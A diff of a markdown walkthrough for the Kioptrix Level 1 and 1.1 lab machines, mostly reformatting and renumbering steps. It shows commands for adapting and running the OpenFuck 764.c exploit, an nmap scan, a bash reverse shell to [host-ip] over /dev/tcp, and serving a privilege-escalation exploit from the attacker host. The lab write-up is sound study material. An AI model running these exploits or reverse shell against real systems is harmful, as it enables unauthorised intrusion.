@@ -44,15 +44,15 @@ Search for the exploit via searchsploit:
 
 Simply make a copy of the <b>764.c</b> exploit and put it somewhere to check it out and make changes to it (because the ‘off-the-shell’ code over there is pretty outdated)
 
-> cp /usr/share/exploitdb/exploits/unix/remote/764.c OpenFuck.c
+`cp /usr/share/exploitdb/exploits/unix/remote/764.c OpenFuck.c`
 
 Here, we need to make some modification to the code before compiling it. Can be done using any text editor such as nano or vim.
 
-> vim OpenFuck.c
+`vim OpenFuck.c`
 
 Below are the list of changes which are needed to be made to the <b>OpenFuck.c</b> code,
 
-<b>Include the openssl rc4 and md5 libraries:</b>
+**Include the openssl rc4 and md5 libraries:**
 
 >#include <openssl/rc4.h>
 
@@ -61,7 +61,7 @@ Below are the list of changes which are needed to be made to the <b>OpenFuck.c</
 Modify the <b>‘wget’</b> method in the exploit itself because the url does not exist anymore. we need to update it to become the new URL to download the file.
 Search for <b>‘wget’</b> in the exploit, and then replace the URL to <b>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</b>
 
-<b>Install Libraries for compiling the modified exploit code:</b>
+**Install Libraries for compiling the modified exploit code:**
 
 > apt-get install libssl-dev
 
@@ -69,7 +69,7 @@ Search for <b>‘wget’</b> in the exploit, and then replace the URL to <b>http
 
 Running the exploit,
 
->./OpenFuck 0x6b <i><b>[machine-ip]</b></i> 443 -c 40
+`./OpenFuck 0x6b <i><b>[machine-ip]</b></i> 443 -c 40`
 
 ![image](https://user-images.githubusercontent.com/31168741/199802750-a1c211c4-c945-4549-bc19-98446b53831b.png)
 
@@ -78,26 +78,19 @@ It worked!
 <h1>Kioptrix Level 1.1(2)</h1>
 
 Step 1:
-Downloading machine and setting up.
+Follow Step 1 & Step 2 from previous one as described to set the machine up and discovering machine IP.
 
 Step 2:
-Run netdiscover to learn the machine IP.
-
->sudo netdiscover -i eth0
-
-![image](https://user-images.githubusercontent.com/31168741/199806037-13dfd40c-2bd7-4bd4-b3bf-6792315bb16b.png)
-
-Step 3:
 Run nmap scan on the machine IP that we found.
 
->sudo nmap -sS -A -p- <i><b>[machine-ip]</b></i> -T4
+`sudo nmap -sS -A -p- [machine-ip] -T4`
 
 ![image](https://user-images.githubusercontent.com/31168741/199806144-1718d44e-5564-429a-8f5e-58d748009ca2.png)
 
-Step 4:
-Let’s take a deeper dive by inspecting what lies in the open port i.e. <i><b>[machine-ip]</b></i>:80
+Step 3:
+Let’s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80
 
-<b>N.B.</b> I reinstalled the machine, ts why the ip changed.
+**N.B.** I reinstalled the machine, ts why the ip changed.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806234-c60c90b3-8521-469f-99b3-da5d9e2a0486.png)
 
@@ -113,7 +106,7 @@ But we need a shell to operate more flexibly.
 
 So, we setup a listener and using a BASH reverse shell to connect to the listener; putting the script below inside the console that we just took privilege:
 
->bash -i >& /dev/tcp/<i><b>[host-ip]</b></i>/1234 0>&1 (host machine)
+`bash -i >& /dev/tcp/<i><b>[host-ip]</b></i>/1234 0>&1` (host machine)
 
 ![image](https://user-images.githubusercontent.com/31168741/199806457-c234670e-b98c-4e34-a371-d713d3d11328.png)
 
@@ -123,7 +116,7 @@ We are into the shell! We look around for more info.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806565-fba7cafa-d421-4b98-9f6f-fffa2ffb736a.png)
 
-Step 5:
+Step 4:
 Looking out for available exploits regarding the version privilege escalation.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806647-16bb2db6-10e1-43ec-8ed1-1d9c67b52842.png)
@@ -132,7 +125,7 @@ We find one and download the exploit.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806720-0134067b-2762-48ca-b830-ee4d28153eb8.png)
 
-Step 6:
+Step 5:
 Running a python server in the host machine so that we can copy the exploit to the target machine.
 
 ![image](https://user-images.githubusercontent.com/31168741/199806805-4fb64c04-ee75-4a27-a721-e9ef97397e13.png)
@@ -143,7 +136,7 @@ Transferring the exploit to the target machine using the Python web server and w
 
 It’s copied. (We are downloading basically!)
 
-Step 7:
+Step 6:
 Compiling the exploit using GCC, allocating execute permissions to it and executing it:
 
 ![image](https://user-images.githubusercontent.com/31168741/199806960-7773eaf1-1689-47b7-859b-95f29d6f672e.png)
